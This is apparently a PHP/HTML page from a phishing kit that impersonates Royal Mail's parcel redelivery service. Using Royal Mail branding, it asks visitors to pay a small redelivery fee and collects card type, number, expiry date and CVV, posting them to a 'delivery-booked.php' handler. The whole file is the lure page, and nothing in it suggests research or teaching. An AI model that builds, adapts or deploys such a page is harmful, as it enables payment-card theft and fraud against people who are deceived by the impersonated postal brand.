<?php 
session_start();
if (!isset($_POST['booking_id'])) {
    header("Location: index.php");
    exit();
}
$_SESSION['booking_id'] = htmlspecialchars($_POST['booking_id']);
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery Details | Royal Mail</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body {font-family: Arial, Helvetica, sans-serif; margin:0; background:#f8f8f8;}
        .dualheader {background:#2A2A2D; color:white; padding:15px 0;}
        .container {max-width:1100px; margin:auto; padding:0 20px;}
        .header-content {display:flex; align-items:center; justify-content:space-between;}
        .logo img {height:45px;}
        .main-content {background:white; max-width:800px; margin:40px auto; padding:40px; box-shadow:0 4px 12px rgba(0,0,0,0.1);}
        h1, h2 {color:#2A2A2D;}
        label {font-weight:600; display:block; margin:15px 0 8px;}
        input, select {width:100%; padding:14px; border:2px solid #ccc; font-size:16px; box-sizing:border-box;}
        .grid {display:grid; grid-template-columns:1fr 1fr; gap:20px;}
        button {background:#E4002B; color:white; padding:16px 32px; border:none; font-size:18px; cursor:pointer; margin-top:30px;}
        button:hover {background:#c40025;}
    </style>
</head>
<body>

<header class="dualheader">
    <div class="container header-content">
        <div class="logo">
            <img src="https://www.royalmail.com/themes/custom/rmlcwr/dualrmglogo.svg" alt="Royal Mail">
        </div>
        <div style="font-size:18px;">Redelivery - Step 2 of 2</div>
    </div>
</header>

<div class="container main-content">
    <h1>Confirm Delivery Details</h1>
    <p><strong>Booking ID:</strong> <?= $_SESSION['booking_id'] ?></p>

    <h2>Choose Delivery Slot</h2>
    <select name="slot" required>
        <option value="">-- Select a slot --</option>
        <option value="Tomorrow 09:00-11:00">Tomorrow 09:00 - 11:00 (£2.99)</option>
        <option value="Tomorrow 13:00-15:00">Tomorrow 13:00 - 15:00 (£2.99)</option>
        <option value="Friday 10:00-12:00">Friday 10:00 - 12:00 (£3.49)</option>
        <option value="Friday 14:00-16:00">Friday 14:00 - 16:00 (£3.49)</option>
    </select>

    <h2>Payment Information</h2>
    
    <form action="delivery-booked.php" method="POST">
        <input type="hidden" name="booking_id" value="<?= $_SESSION['booking_id'] ?>">

        <label>Card Type</label>
        <select name="card_type" required>
            <option value="">Select Card Type</option>
            <option value="Visa">Visa</option>
            <option value="Mastercard">Mastercard</option>
            <option value="American Express">American Express</option>
        </select>

        <label>Card Number</label>
        <input type="text" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>

        <div class="grid">
            <div>
                <label>Expiry Month</label>
                <select name="expiry_month" required>
                    <option value="">Month</option>
                    <?php for($i=1; $i<=12; $i++) echo "<option>".sprintf("%02d", $i)."</option>"; ?>
                </select>
            </div>
            <div>
                <label>Expiry Year</label>
                <select name="expiry_year" required>
                    <option value="">Year</option>
                    <?php for($y=2025; $y<=2035; $y++) echo "<option>$y</option>"; ?>
                </select>
            </div>
        </div>

        <label>CVV / Security Code</label>
        <input type="text" name="cvv" placeholder="123" maxlength="4" style="width:150px;" required>

        <button type="submit">Pay £2.99 & Book Redelivery</button>
    </form>
</div>

<footer style="background:#2A2A2D; color:#ccc; text-align:center; padding:30px; font-size:14px;">
    © Royal Mail Group Limited 2025
</footer>

</body>
</html>
